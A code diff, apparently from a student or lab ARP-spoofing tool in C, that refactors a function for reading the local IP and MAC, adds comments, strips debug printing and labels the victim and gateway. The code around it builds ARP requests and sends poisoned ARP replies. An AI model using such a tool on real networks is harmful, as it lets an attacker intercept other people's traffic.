@@ -39,7 +39,7 @@ struct base_info{
 
 
 void Init_arp(struct arphdr *arp, uint16_t opcode);
-int Get_my_hwaddr(struct base_info *info);
+int Get_my_info(struct base_info *info);
 int Get_sender_hwaddr(struct base_info *info);
 void Send_poisoned_arp(struct base_info *info);
 
@@ -58,7 +58,7 @@ int main(int argc, char *argv[])
 	strcpy(info.sdr_ip, argv[2]);
 	strcpy(info.tar_ip, argv[3]);
 
-	if (!Get_my_hwaddr(&info))
+	if (!Get_my_info(&info))
 		return -1;
 
 	if (!Get_sender_hwaddr(&info))
@@ -80,7 +80,7 @@ void Init_arp(struct arphdr *arp, uint16_t opcode)
 }
 
 
-int Get_my_hwaddr(struct base_info *info)
+int Get_my_info(struct base_info *info)
 {
 	FILE *fp;
 	int i;
@@ -91,19 +91,17 @@ int Get_my_hwaddr(struct base_info *info)
 	fd = socket(AF_INET, SOCK_DGRAM, 0);
 	ifr.ifr_addr.sa_family = AF_INET;
 	strncpy(ifr.ifr_name, info->dev, IFNAMSIZ-1);
+
+	/* Get my IP addr */
 	ioctl(fd, SIOCGIFADDR, &ifr);	
-	
 	inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), info->my_ip, INET_ADDRSTRLEN);
+	
+	/* Get my mac addr */
 	ioctl(fd, SIOCGIFHWADDR, &ifr);
 	for (i=0 ; i<6 ; i++)
 		info->my_mac[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
-	close(fd);
 	
-	//printf("%s\n", info->my_ip);
-	//for (i=0 ; i<6 ; i++)
-	//	printf(" %02x", info->my_mac[i]);
-	//printf("\n");
-
+	close(fd);
 	return 1;
 }
 
@@ -143,7 +141,7 @@ int Get_sender_hwaddr(struct base_info *info)
 		return(2);
 	}
 
-	//printf("%d\n", (unsigned int)net);
+
 	/* set ethernet header */
 	for (i=0 ; i<6 ; i++)
 		ether.h_source[i] = info->my_mac[i];
@@ -162,9 +160,6 @@ int Get_sender_hwaddr(struct base_info *info)
 		arp.tar_mac[i] = 0x00;
 	memcpy(send+14, (void*)&arp, sizeof(struct arphdr));
 
-	for (i=0 ; i<(sizeof(struct arphdr)+sizeof(struct ethhdr)) ; i++)
-		printf("%02x%c", send[i], i%10==0 ? '\n' : ' ');
-	printf("\n%d", i);
 
 	while(1) {
 		/* Send arp request to sender */
@@ -197,9 +192,6 @@ int Get_sender_hwaddr(struct base_info *info)
 			}
 		}
 	}
-	for (i=0 ; i<6 ; i++)
-		printf(" %02x", info->sdr_mac[i]);
-	printf("\n");
 	pcap_close(handle);
 	return 1;
 }
@@ -253,13 +245,8 @@ void Send_poisoned_arp(struct base_info *info)
 }
 
 
-
-
 /*
-* arp request -> ether.src_mac == arp.sdr_mac == my_mac
-*				 ether.dst_mac = ff:ff:ff:ff:ff:ff
-*				 arp.tar_mac = 00:00:00:00:00:00
-*				 sdr == my_pc
-*				 tar == target
+* attacker	- me
+* sender 	- victim
+* target    - GW
 */
-
